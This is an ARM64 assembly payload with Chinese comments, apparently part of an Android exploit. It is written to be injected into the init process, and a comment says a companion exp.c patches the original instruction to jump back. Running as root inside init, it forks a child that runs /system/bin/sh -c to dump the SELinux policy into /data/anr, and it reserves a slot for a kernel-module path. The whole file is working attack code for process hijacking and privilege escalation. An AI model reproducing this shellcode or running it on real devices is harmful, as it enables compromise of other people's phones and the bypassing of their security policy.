.arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:
    dummy_ko_path:
    .skip 64, 0

mutex_file:
    .asciz "/dev/df"
sh_path:
    .asciz "/system/bin/sh"
sh_flag:
    .asciz "-c"
sh_cmd:
    .asciz "mkdir -p /data/anr && cp /sys/fs/selinux/policy /data/anr/anr_dump_policy.txt"
    .balign 8

    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int dummy_ko_path - libcxx_data

    .align 4

libcxx_start:
    // 现场保护：保存所有可能被破坏的寄存器
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // 1. 检查 uid == 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // 2. 检查 tid == 1 (确保在 init 主线程)
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // 3. 创建互斥锁 /dev/df (防止并发重入)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, return // 如果已存在，直接返回

    sub     sp, sp, 16

    // 4. 准备 clone 的参数
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // 5. clone 子进程 (类似 fork)
    mov     x8, SYS_clone
    add     x4, sp, 8
    mov     x3, xzr
    mov     x2, xzr
    mov     x1, xzr
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]
    add     sp, sp, 16

    // 父进程 (init) 返回，恢复现场
    cbnz    w0, return          

worker:
    // 6. 先在子进程中删除 /dev/df，方便下次测试
    mov     x0, -100
    adr     x1, mutex_file
    mov     x8, #SYS_unlinkat
    svc     0

    // 7. 分配 64 字节栈空间用于构造 argv 数组
    sub     sp, sp, 64

    // 构造 argv: ["/system/bin/sh", "-c", "mkdir -p ... && cp ...", NULL]
    adr     x1, sh_path
    str     x1, [sp, 0]
    
    adr     x1, sh_flag
    str     x1, [sp, 8]
    
    adr     x1, sh_cmd
    str     x1, [sp, 16]
    
    str     xzr, [sp, 24] // NULL 结尾

    // 8. execve("/system/bin/sh", argv, NULL)
    adr     x0, sh_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

    // 如果 execve 失败，恢复栈并退出
    add     sp, sp, 64
    b       myexit

myexit:
    // 子进程安全退出
    mov     x0, #0
    mov     x8, #SYS_exit
    svc     0

return:
    // 现场恢复（与开头严格对应，绝对不让 init 炸）
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

libcxx_first_inst_copy:
    // 原指令，exp.c 会把末尾的 b end 替换为 jmpback
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
